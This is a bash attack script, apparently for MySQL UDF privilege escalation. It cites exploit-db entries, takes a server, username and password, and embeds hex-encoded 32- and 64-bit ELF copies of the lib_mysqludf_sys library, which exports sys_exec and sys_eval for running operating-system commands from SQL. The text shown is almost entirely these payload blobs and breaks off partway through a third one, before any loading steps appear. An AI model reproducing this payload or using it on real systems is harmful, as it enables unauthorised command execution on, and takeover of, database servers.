#!/bin/bash

#resources:
#https://www.exploit-db.com/exploits/50236
#https://www.exploit-db.com/papers/44139/
#https://github.com/mysqludf/lib_mysqludf_sys  <-- this is the udf file I used

scriptname=$0
if [ $# -eq 0 ]; then
    echo "Usage:"
    echo "$scriptname <server> <username> <password>"
    exit
fi


host=$1
username=$2
password=$3

shellcode_x32="7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000"
shellcode_x64="7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000"

#xxd -p myudf.so| tr -d '\n' | xclip -selection clipboard

shellcode="7f454c460101010000000000000000000300030001000000c008000034000000a824000000000000340020000500280020001d0001000000000000000000000000000000bc0f0000bc0f0000050000000010000001000000041f0000041f0000041f00000801000010010000060000000010000002000000181f0000181f0000181f0000d0000000d0000000060000000400000051e574640000000000000000000000000000000000000000060000000400000052e57464041f0000041f0000041f0000fc000000fc00000004000000010000001100000025000000000000000e00000000000000030000001b00000000000000070000001c0000000a0000001500000010000000160000000d0000000f0000001f000000060000001d00000000000000000000000000000001000000000000000000000002000000040000000000000024000000230000002000000000000000140000001e000000180000000c000000000000000000000005000000090000002200000012000000000000001900000021000000080000000b0000000000000011000000000000001a00000000000000170000000000000013000000000000001100000011000000040000000700000001080440801946c99ca40803900460831100000013000000140000001600000017000000190000001c0000001e000000000000001f00000000000000200000002100000022000000230000002400000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed971581ca868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff3b9fd4a0ad73d1c50b5911feab5fbe12000000000000000000000000000000004c010000000000000000000012000000010000000000000000000000200000002500000000000000000000002000000052010000000000000000000012000000b20000000000000000000000120000001e0100000000000000000000120000005a01000000000000000000001200000062010000000000000000000012000000e300000000000000000000001200000054000000000000000000000012000000b9000000000000000000000012000000cd0000000000000000000000120000006f01000000000000000000001200000016000000000000000000000022000000f000000000000000000000001200000068010000000000000000000012000000e8000000680b0000ac00000012000b0033010000e40c00000500000012000b0010000000b80e00000000000012000c0078000000bb0900002f00000012000b00ff000000600800000000000012000900910100000c200000000000001000f1ff15010000700c00001d00000012000b009d01000014200000000000001000f1ff9b000000370a00000500000012000b00250100008d0c00005700000012000b00aa0000003c0a00003e00000012000b005b000000b60900000500000012000b008e000000ea0900004d00000012000b008a0100000c200000000000001000f1ff050100006b0c00000500000012000b00c00000007a0a0000ce00000012000b00f7000000140c00005700000012000b00390000007c0900003a00000012000b00d4000000480b00002000000012000b0043010000e90c00009301000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f696e6974006d656d637079006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007374726c656e007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f73657400736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3400474c4942435f322e3000474c4942435f322e31000000020000000000030003000300030003000300030003000300040005000300020001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000400800100001000000000000000731f690900000500a2010000100000001469690d00000400ae010000100000001069690d00000300b8010000100000001169690d00000200c2010000000000009709000008000000cd090000080000001e0a000008000000960a000008000000c60a000008000000290b000008000000520c000008000000cb0c0000080000005e0d0000080000000820000008000000a2090000020a0000d8090000020a0000290a0000020a0000a10a0000020a0000d10a0000020a0000340b0000020a0000a70b0000020a0000de0b0000020a00005d0c0000020a0000d60c0000020a00004e0a0000020500006a0a0000020b00007c0d0000020b0000550e0000020b0000070b0000020c00003b0d0000020c0000620b000002090000090c0000020f0000820c000002060000660d000002010000a20d000002040000d30d000002070000ff0d000002080000150e000002100000760e0000020d0000e81f000006020000ec1f000006030000f01f0000060e0000002000000702000004200000070e00005589e55383ec04e8000000005b81c3881700008b93f4ffffff85d27405e81e000000e8b9000000e8f4050000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c32a17000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3ab16000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e583ec288b450c8b0085c07421c744240832000000c7442404d40e00008b4510890424e8fcffffffc645ff01eb04c645ff000fb645ffc9c35589e55dc35589e583ec18c74424081f000000c7442404080f00008b4510890424e8fcffffff8b4514c7001e0000008b4510c9c35589e583ec188b450c8b0083f80175188b450c8b40048b0085c0750c8b4508c60001c645ff00eb1fc74424082b000000c7442404280f00008b4510890424e8fcffffffc645ff010fb645ffc9c35589e55dc35589e583ec188b450c8b40088b00890424e8fcffffff8945fc837dfc0075088b4518c60001eb128b45fc890424e8fcffffff89c28b451489108b45fcc9c35589e583ec188b450c8b0083f8027424c74424081f000000c7442404540f00008b4510890424e8fcffffffc645ff01e9940000008b450c8b40048b0085c07421c744240828000000c7442404740f00008b4510890424e8fcffffffc645ff01eb678b450c8b400483c004c700000000008b450c8b400c8b108b450c8b400c83c0048b008d040283c002890424e8fcffffff89c28b450889500c8b45088b400c85c07521c74424081a000000c74424049c0f00008b4510890424e8fcffffffc645ff01eb04c645ff000fb645ffc9c35589e583ec088b45088b400c85c0740e8b45088b400c890424e8fcffffffc9c35589e583ec288b45088b400c8945fc8b450c8b400c8b0083c0010345fc8945f88b450c8b400c8b108b450c8b40088b0089542408894424048b45fc890424e8fcffffff8b450c8b400c8b000345fcc600008b450c8b400c83c0048